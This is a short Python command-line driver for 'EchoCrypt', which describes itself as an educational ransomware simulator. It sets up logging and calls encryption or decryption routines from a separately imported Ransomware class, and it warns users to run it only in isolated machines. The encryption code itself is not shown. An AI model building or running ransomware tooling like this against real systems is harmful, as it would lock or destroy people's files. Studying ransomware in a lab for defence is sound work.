import sys
import logging
import argparse
from modules import Ransomware 

# --- Logging Setup Start ---
log_filename = 'echocrypt.log' # All activities are recorded in the ransomware log file.

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(log_filename),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)
# --- Logging Setup End ---

def main():
    """
    Parses command-line arguments and executes encryption or decryption operations
    using the Ransomware class.
    """
    logger.info("EchoCrypt Start")

    parser = argparse.ArgumentParser(
        description="EchoCrypt Ransomware Encryption/Decryption Simulator for Educational Purposes.\n\n"
                    "Warning: This simulator is for educational use only. Using it for malicious purposes\n"
                    "on real systems can cause serious damage.\n"
                    "Always test in an isolated environment (e.g., virtual machine).",
        formatter_class=argparse.RawTextHelpFormatter
    )

    parser.add_argument('--decrypt', action='store_true', help='Run decryption process (Restoration phase)')
    args = parser.parse_args()


    simulator = Ransomware()
    if args.decrypt:
        simulator.run_decryption()
    else:
        simulator.run_encryption()

    logger.info("echocrypt Ransomware program exited.")

if __name__ == "__main__":
    main()